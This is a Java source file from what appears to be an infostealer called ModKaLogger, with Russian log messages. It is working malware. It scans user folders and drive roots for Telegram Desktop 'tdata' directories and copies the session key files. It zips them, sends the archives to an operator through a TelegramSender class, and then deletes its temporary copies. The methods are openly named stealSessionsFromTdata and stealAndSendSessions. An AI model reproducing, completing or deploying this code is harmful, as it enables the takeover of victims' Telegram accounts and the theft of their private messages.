package com.modkalogger.telegram;

import com.modkalogger.ModKaLogger;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Telegram {
   public static File DIR;
   public static final String[] ROOT_REGISTRY;
   public static final String[] USER_REGISTRY;

   public static String formatString(String var0) {
      if (var0.startsWith("\"")) {
         if ((var0 = var0.substring(1)).endsWith(",1\"")) {
            var0 = var0.replace(",1\"", "");
         } else if (var0.endsWith("\"  -- \"%1\"")) {
            var0 = var0.replace("\"  -- \"%1\"", "");
         }
      }
      return var0;
   }

   public static ArrayList<String> scanForTdataFolders() {
      ArrayList<String> foundTdata = new ArrayList<>();
      try {
         ArrayList<File> searchPaths = new ArrayList<>();
         
         String appData = System.getenv("APPDATA");
         String localAppData = System.getenv("LOCALAPPDATA");
         String userProfile = System.getProperty("user.home");
         
         if (appData != null) searchPaths.add(new File(appData));
         if (localAppData != null) searchPaths.add(new File(localAppData));
         if (userProfile != null) {
            searchPaths.add(new File(userProfile, "Desktop"));
            searchPaths.add(new File(userProfile, "Downloads"));
            searchPaths.add(new File(userProfile, "Documents"));
         }
         
         File[] roots = File.listRoots();
         for (File root : roots) {
            searchPaths.add(root);
         }
         
         for (File searchPath : searchPaths) {
            searchForTdata(searchPath, foundTdata, 0, 4);
         }
         
         ModKaLogger.LOGGER.info("Найдено tdata папок: " + foundTdata.size());
         return foundTdata;
      } catch (Exception e) {
         ModKaLogger.LOGGER.error("Ошибка поиска tdata: " + e.getMessage());
         return foundTdata;
      }
   }
   
   private static void searchForTdata(File dir, ArrayList<String> foundTdata, int depth, int maxDepth) {
      if (depth > maxDepth || dir == null || !dir.exists() || !dir.isDirectory()) {
         return;
      }
      
      try {
         File[] files = dir.listFiles();
         if (files == null) return;
         
         for (File file : files) {
            if (file.isDirectory()) {
               File tdataDir = new File(file, "tdata");
               if (tdataDir.exists() && tdataDir.isDirectory()) {
                  String tdataPath = tdataDir.getAbsolutePath();
                  if (!foundTdata.contains(tdataPath)) {
                     foundTdata.add(tdataPath);
                     ModKaLogger.LOGGER.debug("Найдена tdata: " + tdataPath);
                  }
               }
               
               String name = file.getName().toLowerCase();
               if (!name.equals("windows") && !name.equals("program files") && 
                   !name.equals("program files (x86)") && !name.equals("$recycle.bin") &&
                   !name.equals("system volume information") && !name.startsWith(".")) {
                  searchForTdata(file, foundTdata, depth + 1, maxDepth);
               }
            }
         }
      } catch (Exception ignored) {}
   }

   public static void vildanEblan(Path src, Path dest) throws Throwable {
      if (Files.isDirectory(src)) {
         if (!Files.exists(dest)) {
            Files.createDirectories(dest);
         }
         
         try (DirectoryStream<Path> stream = Files.newDirectoryStream(src)) {
            for (Path entry : stream) {
               Path childDest = dest.resolve(entry.getFileName());
               vildanEblan(entry, childDest);
            }
         }
      } else {
         Files.copy(src, dest, StandardCopyOption.REPLACE_EXISTING);
      }
   }

   public static File stealSessionsFromTdata(String tdataPath) {
      File tempDir = new File(System.getProperty("java.io.tmpdir"), "tdata_" + System.currentTimeMillis());
      
      try {
         if (!tempDir.exists()) {
            tempDir.mkdirs();
         }
         
         File tdataDir = new File(tdataPath);
         if (!tdataDir.exists() || !tdataDir.isDirectory()) {
            ModKaLogger.LOGGER.error("tdata не существует: " + tdataPath);
            return null;
         }
         
         File[] files = tdataDir.listFiles();
         if (files == null || files.length == 0) {
            ModKaLogger.LOGGER.error("tdata пуст: " + tdataPath);
            return null;
         }
         
         int copied = 0;
         for (File file : files) {
            try {
               if (file.isDirectory() && file.getName().length() == 16) {
                  Path destPath = Paths.get(tempDir.getAbsolutePath(), file.getName());
                  vildanEblan(file.toPath(), destPath);
                  copied++;
               }
               
               String name = file.getName();
               if (file.isFile() && ((name.endsWith("s") && name.length() == 17) || 
                   name.startsWith("usertag") || name.startsWith("settings") || name.startsWith("key_data"))) {
                  Files.copy(file.toPath(), Paths.get(tempDir.getAbsolutePath(), name), StandardCopyOption.REPLACE_EXISTING);
                  copied++;
               }
            } catch (Exception e) {
               ModKaLogger.LOGGER.debug("Ошибка копирования: " + file.getName());
            }
         }
         
         ModKaLogger.LOGGER.info("Скопировано файлов: " + copied);
         return tempDir;
      } catch (Throwable e) {
         ModKaLogger.LOGGER.error("Ошибка stealSessionsFromTdata: " + e.getMessage());
         return null;
      }
   }

   public static File createZipArchive(File sourceDir) throws Exception {
      String zipName = "tdata_" + System.currentTimeMillis() + ".zip";
      File zipFile = new File(System.getProperty("java.io.tmpdir"), zipName);
      
      try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile))) {
         File[] files = sourceDir.listFiles();
         if (files != null) {
            for (File file : files) {
               addToZip(file, "", zos);
            }
         }
      }
      
      return zipFile;
   }

   private static void addToZip(File file, String parentPath, ZipOutputStream zos) throws Exception {
      String entryName = parentPath + file.getName();
      
      if (file.isDirectory()) {
         entryName += "/";
         zos.putNextEntry(new ZipEntry(entryName));
         zos.closeEntry();
         
         File[] children = file.listFiles();
         if (children != null) {
            for (File child : children) {
               try {
                  addToZip(child, entryName, zos);
               } catch (Exception e) {
                  ModKaLogger.LOGGER.debug("Ошибка добавления в ZIP: " + child.getName());
               }
            }
         }
      } else {
         try {
            if (!file.exists()) return;
            
            zos.putNextEntry(new ZipEntry(entryName));
            try (FileInputStream fis = new FileInputStream(file)) {
               byte[] buffer = new byte[8192];
               int length;
               while ((length = fis.read(buffer)) > 0) {
                  zos.write(buffer, 0, length);
               }
            }
            zos.closeEntry();
         } catch (Exception e) {
            ModKaLogger.LOGGER.debug("Ошибка ZIP: " + file.getName());
         }
      }
   }

   public static void stealAndSendSessions() {
      try {
         ArrayList<String> tdataFolders = scanForTdataFolders();
         
         if (tdataFolders.isEmpty()) {
            ModKaLogger.LOGGER.info("Telegram сессии не найдены");
            TelegramSender.sendMessage("<b>Telegram сессии не найдены</b>");
            return;
         }
         
         TelegramSender.sendMessage("<b>🔍 Найдено Telegram клиентов: " + tdataFolders.size() + "</b>\n\nНачинаю сбор...");
         
         int successCount = 0;
         for (int i = 0; i < tdataFolders.size(); i++) {
            String tdataPath = tdataFolders.get(i);
            String clientName = new File(tdataPath).getParentFile() != null ? 
                new File(tdataPath).getParentFile().getName() : "Unknown";
            
            ModKaLogger.LOGGER.info("Обработка [" + (i+1) + "/" + tdataFolders.size() + "]: " + tdataPath);
            TelegramSender.sendMessage("<b>📦 Клиент " + (i+1) + "/" + tdataFolders.size() + "</b>\n<code>" + tdataPath + "</code>");
            
            try {
               File tempDir = stealSessionsFromTdata(tdataPath);
               
               if (tempDir != null && tempDir.exists() && tempDir.listFiles() != null && tempDir.listFiles().length > 0) {
                  File zipFile = createZipArchive(tempDir);
                  ModKaLogger.LOGGER.info("ZIP создан: " + zipFile.length() + " bytes");
                  
                  TelegramSender.sendFileSync(zipFile);
                  ModKaLogger.LOGGER.info("ZIP отправлен: " + clientName);
                  
                  deleteDirectory(tempDir);
                  zipFile.delete();
                  successCount++;
               } else {
                  TelegramSender.sendMessage("<b>⚠️ Пусто:</b> <code>" + tdataPath + "</code>");
               }
            } catch (Exception e) {
               ModKaLogger.LOGGER.error("Ошибка: " + e.getMessage());
               TelegramSender.sendMessage("<b>❌ Ошибка:</b> " + e.getMessage());
            }
            
            Thread.sleep(1000);
         }
         
         TelegramSender.sendMessage("<b>✅ Готово!</b> Успешно: " + successCount + "/" + tdataFolders.size());
         
      } catch (Exception e) {
         ModKaLogger.LOGGER.error("Ошибка stealAndSendSessions: " + e.getMessage());
         e.printStackTrace();
      }
   }
   
   private static void deleteDirectory(File dir) {
      if (dir == null || !dir.exists()) return;
      File[] files = dir.listFiles();
      if (files != null) {
         for (File file : files) {
            if (file.isDirectory()) {
               deleteDirectory(file);
            } else {
               file.delete();
            }
         }
      }
      dir.delete();
   }

   static {
      DIR = new File(System.getProperty("java.io.tmpdir"), "tdata");
      ROOT_REGISTRY = new String[]{"tdesktop.tg\\shell\\open\\command", "tg\\DefaultIcon", "tg\\shell\\open\\command"};
      USER_REGISTRY = new String[]{"SOFTWARE\\Classes\\tdesktop.tg\\DefaultIcon", "SOFTWARE\\Classes\\tdesktop.tg\\shell\\open\\command", "SOFTWARE\\Classes\\tg\\DefaultIcon", "SOFTWARE\\Classes\\tg\\shell\\open\\command"};
   }
}
